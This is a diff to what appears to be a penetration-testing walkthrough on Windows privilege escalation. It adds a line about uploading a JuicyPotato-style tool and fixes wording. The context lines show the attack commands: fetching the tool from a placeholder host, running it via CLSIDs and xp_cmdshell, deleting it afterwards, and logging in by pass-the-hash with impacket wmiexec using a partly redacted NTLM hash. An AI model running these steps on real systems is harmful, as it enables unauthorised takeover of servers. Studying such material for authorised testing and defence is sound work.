@@ -68,10 +68,12 @@ SeCreateGlobalPrivilege       Create global objects                     Enabled
 SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
 
 
+==> To perform the privesc we need to upload the tool 'juicy-jfc.exe' on the target server.
+
 > PS C:\Users\Public\Documents> WGET http://X.X.X.X/juicy-jfc.exe -outfile juicy-jfc.exe 
 
 
-==> First we test the local privilege escalation without indicating a CLSID (so the one by default '{4991d34b-80a1-4291-83b6-3328366b9097}' will be tested). 
+==> We test the local privilege escalation without indicating a CLSID (so the one by default '{4991d34b-80a1-4291-83b6-3328366b9097}' will be tested). 
     
 > PS C:\Users\Public\Documents> ./juicy-jfc.exe -l 8888 -p c:\Windows\System32\whoami.exe -t *
 Testing {4991d34b-80a1-4291-83b6-3328366b9097} 8888
@@ -266,7 +268,7 @@ admin:1001:aad3b435b51404eeaad3b435b51404ee:6de00c52dbabb0<SNIP>
 > EXEC master..xp_cmdshell 'c:\temp\audit_jfc.exe -l 8888 -p c:\Windows\System32\cmd.exe -a "/c del C:\temp\audit_jfc.exe" -t * -c {752073A1-23F2-4396-85F0-8FDB879ED0ED}'
 
 
-==> We log into the target server as a local adminitrator using the account 'admin' and wmiexec from impacket.
+==> We log into the target server as a local administrator using the account 'admin' and the tool wmiexec from impacket.
 
 > $ python wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:6de00c52dbabb0<SNIP> admin@SQLserver04
 
